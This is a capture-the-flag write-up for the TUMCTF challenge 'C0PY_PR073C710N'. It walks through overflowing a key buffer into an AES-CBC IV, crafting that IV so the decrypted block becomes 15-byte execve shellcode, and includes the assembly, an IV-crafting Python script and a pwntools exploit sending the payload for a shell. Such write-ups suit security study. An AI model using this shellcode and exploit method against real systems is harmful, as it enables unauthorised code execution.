## TUMCTF: C0PY_PR073C710N

---------------
## Write-up

For this challenge we are given a binary that decrypts a protected code block, and then jumps to it.
The binary decrypts the protected block using aes128 in cbc mode, and we supply the key.
The key for aes128 is 16 bytes long, and the fgets that reads the key from stdin is reading 33 bytes.
So we have a buffer overflow here, and we can overrun the iv.

Because its a cbc mode encryption, if we know what the encrypted block gets decrypted to, using a specially crafted
IV we can control the first plaintext block - that is, 16 bytes of code to our choosing.

So what can we do with 16 bytes of code?
By the given hint it looks like we should exploit this with ret2libc, but we went a different path.
The shortest shellcode that calls execve /bin/sh that we found is 27 bytes long - much more then we have.
It can be found [here](http://shell-storm.org/shellcode/files/shellcode-806.php)

This shellcode has some constrains that we do not - it has no null bytes. We do not care about having null bytes.
But most importantly, we can pass `/bin/sh` in the key, that is in the stack, in a constant location from rsp
when the shellcode executes! this means, we can drastically reduce the shellcode's size by not including
the string `/bin/sh` with it, but passing it as a part of the key!
By doing this, we reduced the shellcode's size to 15 bytes.
The shellcode was compiled with fasm.
```assembly
use64

; Load path to execute from key.
; The key is in rsp+0x10, and we store the file
; to execute in the end of the key.
lea rdi, [rsp + 0x19]

cdq
push rdx
push rdi

;mov rsi, rsp
push rsp
pop rsi

;Perform the execve syscall
push 0x3b
pop rax
syscall

;pad to 16 bytes
nop
```

So all we need to do now, is craft an iv using the key `aaaaaaaaa/bin/sh`.
the iv crafting script is provided here:
```python
from Crypto.Cipher import AES

DUMMY_KEY = 'aaaaaaaaa/bin/sh'

CIPHER = "\xc8V\xf9]\x1fk\xcd'\\\xd8~\x91\xa8\x90\xa3\x1dI^\xc0\x92)C\xb7\xb9\x9a\xb1I\x1e\x88O\x16\x8E"
CIPHER_16 = CIPHER[:16]

SHELLCODE = 'H\x8d|$\x19\x99RWT^j;X\x0f\x05\x90'


def assert_will_be_shellcode(crafted_iv, shellcode):
	assert shellcode == AES.AESCipher(DUMMY_KEY, IV=crafted_iv, mode=AES.MODE_CBC).decrypt(CIPHER_16)

def make_shellcode():
	return make(SHELLCODE)
	
def make(shellcode):
	global DUMMY_KEY
	
	# AES without IV - ECB mode
	plain_aes = AES.new(DUMMY_KEY)
	crafted_iv = plain_aes.decrypt(CIPHER_16)
	byte_arr = []
	for i in xrange(16):
		byte_arr.append(chr(ord(crafted_iv[i]) ^ ord(shellcode[i])))
	
	crafted_iv = "".join(byte_arr)
	assert_will_be_shellcode(crafted_iv, shellcode)
	
	return DUMMY_KEY + '\0' + crafted_iv
```

and now, send the shellcode the the server, and get a remote shell:

```python
from pwn import *

#r = remote('104.154.90.175', 54509)
r = process('./cat_flag')

r.send('aaaaaaaaa/bin/sh\x00\r\xc1\xae\x19y\xff\xb5\x959\xb7\xd2*\xbc\x9a\x98G')
r.interactive()
```

The exploit doesn't rely on a specific libc version.